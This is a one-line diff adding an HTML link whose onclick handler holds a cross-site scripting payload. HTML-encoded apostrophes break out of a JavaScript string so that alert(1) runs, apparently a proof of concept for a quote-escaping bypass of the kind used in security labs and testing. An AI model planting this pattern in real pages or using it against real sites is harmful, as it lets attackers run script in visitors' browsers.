@@ -1,0 +1,1 @@
+<a id="author" href="http://anmolksachan.github.io/" onclick="var tracker='http://foo?&apos;-alert(1)-&apos;';">Go Back </a>
